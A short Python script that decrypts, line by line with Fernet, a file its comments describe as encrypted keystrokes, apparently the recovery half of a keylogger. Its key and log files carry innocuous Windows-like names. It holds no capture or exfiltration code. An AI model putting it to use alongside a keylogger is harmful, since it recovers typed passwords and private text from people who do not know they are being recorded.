from cryptography.fernet import Fernet

# Load the encryption key from the 'windows.key' file
def load_key():
    return open("windows.key", "rb").read()

# Decrypt the contents of the encrypted keystrokes file
def decrypt_file(encrypted_file_name):
    key = load_key()
    fernet = Fernet(key)
    decrypted_content = []

    # Open the encrypted file and decrypt each line
    with open(encrypted_file_name, "rb") as encrypted_file:
        for line in encrypted_file:
            decrypted_data = fernet.decrypt(line.strip())
            decrypted_content.append(decrypted_data.decode())

    # Write the decrypted content to a new file
    with open("decrypted_keys.txt", "w") as decrypted_file:
        decrypted_file.write("\n".join(decrypted_content))

# Example: Decrypt the 'windows_key.txt' file
decrypt_file("windows_key.txt")
